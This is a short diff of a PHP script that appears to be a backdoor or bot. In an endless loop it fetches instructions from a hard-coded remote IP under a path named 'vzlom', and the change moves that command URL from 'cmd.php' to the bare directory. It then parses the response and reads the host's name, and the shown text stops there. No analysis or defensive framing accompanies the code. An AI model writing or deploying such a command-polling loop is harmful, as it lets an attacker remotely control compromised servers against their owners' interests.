@@ -1,6 +1,6 @@
 <?php
 while (1) {
-$x=file_get_contents("http://3.120.174.176/vzlom/cmd.php");
+$x=file_get_contents("http://3.120.174.176/vzlom/");
 $x=explode(".",$x);
 $hn=gethostname();
 if ($x[0]=='' || $x[1]=='') {
